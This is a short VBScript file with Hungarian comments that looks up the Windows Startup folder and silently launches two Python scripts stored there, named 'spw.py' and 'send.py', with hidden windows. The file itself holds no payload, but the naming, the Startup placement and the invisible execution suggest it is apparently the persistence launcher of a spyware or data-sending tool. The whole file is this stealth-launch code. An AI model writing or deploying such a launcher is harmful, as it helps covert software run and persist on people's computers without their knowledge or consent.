Option Explicit

Dim shell, startupPath, pythonExe, spwPath, sendPath

Set shell = CreateObject("WScript.Shell")

' Startup mappa helye
startupPath = shell.SpecialFolders("Startup")

' Python elérési út (ha máshol van, átírjuk)
pythonExe = "C:\Python311\python.exe"

' A két Python script elérési útja
spwPath = startupPath & "\spw.py"
sendPath = startupPath & "\send.py"

' Indítás láthatatlanul
shell.Run """" & pythonExe & """ """ & spwPath & """", 0, False
shell.Run """" & pythonExe & """ """ & sendPath & """", 0, False
